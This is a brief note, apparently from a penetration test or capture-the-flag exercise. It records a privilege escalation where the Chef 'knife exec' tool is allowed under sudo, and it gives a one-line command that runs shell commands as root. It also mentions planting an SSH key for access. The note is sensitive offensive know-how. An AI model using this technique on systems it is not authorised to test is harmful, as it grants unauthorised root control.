Put my SSH key to Json (but its not neccessary)

can run the ruby knife tools as root
can execute commands as root: https://docs.chef.io/workstation/knife_exec/

```bash
sudo /usr/bin/knife exec -E 'system("whoami")'
```